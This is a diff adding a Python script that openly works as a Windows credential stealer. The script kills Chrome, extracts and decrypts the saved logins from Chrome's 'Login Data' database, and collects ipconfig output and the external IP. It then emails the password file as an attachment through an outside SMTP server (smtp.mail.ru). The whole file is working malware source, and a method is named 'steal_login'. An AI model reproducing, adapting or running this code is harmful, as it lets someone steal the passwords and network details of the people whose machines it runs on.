@@ -1,0 +1,114 @@
+#bosh_qayitma
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import os
+import urllib.request
+import subprocess
+import datetime
+import smtplib
+import sqlite3
+import win32crypt
+import time
+
+
+class bosh_qayitma():
+    os.chdir("C:/Users/%s/Desktop" % os.getlogin())
+
+    def __init__(self):
+        self.steal_login()
+        self.mac_and_local()
+        self.external_ip()
+        self.txt_yaz()
+        self.send_mail()
+
+    def txt_yaz(self):
+        time = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
+        txt = open("test.txt", "w")
+        txt.write("SYSTEM INFORMATIONS - %s \n\n" % time)
+        try:
+            for i in self.myset:
+                res = i.decode("utf-8")
+                txt.write("%s" % res)
+            txt.write("***********************************************************************\n")
+            txt.write("EXTERNAL IP- %s\n" % self.ext_ip)
+            txt.write("***********************************************************************\n")
+            txt.close()
+        except:
+            txt.write("Some problem occured")
+            txt.close()
+
+    def external_ip(self):
+        try:
+            self.ext_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+        except:
+            self.ext_ip="External ip could not be found"
+
+    def mac_and_local(self):
+        proc = subprocess.Popen(['ipconfig', '/all'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.myset = set(proc.stdout)
+
+    def steal_login(self):
+        data_path = os.path.expanduser("C:/Users/%s/AppData/Local/Google/Chrome/User Data/Default" % os.getlogin())
+        login_db = os.path.join(data_path, 'Login Data')
+        try:
+            os.system("TASKKILL /F /IM chrome.exe")
+        except:
+            pass
+        # db connect and query
+        c = sqlite3.connect(login_db)
+        cursor = c.cursor()
+        select_statement = "SELECT origin_url, username_value, password_value FROM logins"
+        cursor.execute(select_statement)
+        login_data = cursor.fetchall()
+
+        credential = {}
+        # decrytping the password
+        for url, user_name, pwd, in login_data:
+            pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)  # This returns a tuple description and the password
+            credential[url] = user_name, pwd[1]
+        with open("parollar.txt", "w") as write:
+            for url, credentials in credential.items():
+                if credentials[1]:
+                    password = str(credentials[1]).replace("'", "")
+                    if credentials[0] == "":
+                        write.write("\n" + url + "\n" + "Username not found" + " | " + password[1:] + "\n")
+                    else:
+                        write.write("\n" + url + "\n" + str(credentials[0]) + " | " + password[1:] + "\n")
+                else:
+                    pass
+            write.close()
+
+    def send_mail(self):
+        fayllar1='C:/Users/%s/Desktop/configs.txt'%os.getlogin()
+        fayllar2='C:/Users/%s/Desktop/parollar.txt' % os.getlogin()
+        files=[fayllar1,fayllar2]
+        msg = MIMEMultipart()
+        msg['Subject'] = 'Found!!!'
+        msg.attach(MIMEText("Accepted succesfully"))
+
+        for i in files:
+            attachment = MIMEBase('application', 'octet-stream')
+            attachment.set_payload(open(i, 'rb').read())
+            encoders.encode_base64(attachment)
+            attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(i))
+            msg.attach(attachment)
+
+        server = smtplib.SMTP('smtp.mail.ru', 2525)
+        server.connect('smtp.mail.ru', 2525)
+        server.ehlo()
+        server.starttls()
+        server.ehlo()
+        server.login("email", "pass")
+        server.sendmail("sending emil", "to", msg.as_string())
+        server.quit()
+
+if __name__=="__main__":
+    gonder=bosh_qayitma()
+
+
+
+
+
+
